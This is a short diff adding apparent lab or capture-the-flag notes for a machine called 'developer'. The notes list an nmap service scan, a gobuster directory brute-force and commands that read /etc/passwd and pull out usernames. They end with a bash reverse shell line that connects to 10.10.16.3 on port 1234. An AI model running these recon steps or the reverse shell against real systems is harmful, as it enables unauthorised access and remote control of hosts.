@@ -1,0 +1,9 @@
+nmap -sV -sC 10.10.11.103 -o nmap.developer.txt
+
+gobuster dir -u 10.10.11.103 -w Subdomain.txt -o gobuster.developer.txt
+
+cat /etc/passwd 
+cat /etc/passwd | cut -d: -f1
+
+/bin/bash -i >& /dev/tcp/10.10.16.3/1234 0>&1
+
